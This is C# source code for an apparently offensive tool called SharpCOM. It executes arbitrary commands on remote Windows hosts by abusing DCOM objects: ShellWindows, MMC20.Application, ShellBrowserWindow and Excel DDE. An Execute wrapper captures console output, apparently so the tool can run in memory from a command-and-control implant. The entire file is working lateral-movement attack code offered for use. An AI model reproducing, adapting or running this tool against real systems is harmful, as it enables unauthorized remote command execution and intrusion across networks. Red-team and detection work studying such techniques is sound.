using System;
using NDesk.Options;
using System.Reflection;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpCOM
{
    public class Program
    {
[DllImport("shell32.dll", SetLastError = true)]
static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

public static string[] CommandLineToArgs(string commandLine)
{
    int argc;
    var argv = CommandLineToArgvW(commandLine, out argc);
    if (argv == IntPtr.Zero)
        throw new System.ComponentModel.Win32Exception();
    try
    {
        var args = new string[argc];
        for (var i = 0; i < args.Length; i++)
        {
            var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
            args[i] = Marshal.PtrToStringUni(p);
        }

        return args;
    }
    finally
    {
        Marshal.FreeHGlobal(argv);
    }
}

public static string Execute(string commandLine)
{
    var sw = new StringWriter();
    Console.SetOut(sw);
    Console.SetError(sw);

    try
    {
        Main(CommandLineToArgs(commandLine));
    }
    catch (Exception e)
    {
        return e.ToString();
    }

    return sw.ToString();
}

        public static void Main(string[] args)
        {
            string Method = null;
            string ComputerName = null;
            string Directory = "C:\\WINDOWS\\System32\\";
            string Parameters = "/c";
            string BaseCommand = "cmd.exe";
            string Command = null;
            bool showhelp = false;
            OptionSet opts = new OptionSet()
            {
                { "Method=", " --Method ShellWindows", v => Method = v },
                { "ComputerName=", "--ComputerName host.example.local", v => ComputerName = v },
                { "Command=", "--Command calc.exe", v => Command = v },
                { "Parameters=", "--Parameters", v => Parameters =v },
                { "h|?|help",  "Show available options", v => showhelp = v != null },
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if (showhelp)
            {
                Console.WriteLine("RTFM");
                opts.WriteOptionDescriptions(Console.Out);
                Console.WriteLine("[*] Example: SharpCOM.exe --Method ShellWindows --ComputerName localhost --Command calc.exe");
                return;
            }

            try
            {
                if (Method == "ShellWindows")
                {
                    var CLSID = "9BA05972-F6A8-11CF-A442-00A0C90A8F39";
                    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), ComputerName);
                    object RemoteComObject = NewMethod(ComType);
                    object Item = RemoteComObject.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { });
                    object Document = Item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, Item, null);
                    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { BaseCommand, Parameters + " " + Command, Directory, null, 0 });
                }
                else if (Method == "MMC")
                {
                    Type ComType = Type.GetTypeFromProgID("MMC20.Application", ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                    object ActiveView = Document.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, Document, null);
                    ActiveView.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, ActiveView, new object[] { Command , null , Parameters , 7 });
                }
                else if (Method == "ShellBrowserWindow")
                {
                    var CLSID = "C08AFD90-F2A1-11D1-8455-00A0C91F3880";
                    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { BaseCommand, Parameters + " " + Command, Directory, null, 0 });
                }
                else if (Method == "ExcelDDE")
                {
                    Type ComType = Type.GetTypeFromProgID("Excel.Application", ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    RemoteComObject.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, RemoteComObject, new object[] { false });
                    RemoteComObject.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { Command, Parameters });
                }
                else
                {
                    Console.WriteLine("You must supply arguments!");
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("DCOM Failed: " + e.Message);
            }
            
        }

        private static object NewMethod(Type ComType)
        {
            return Activator.CreateInstance(ComType);
        }
    }
}

   
   

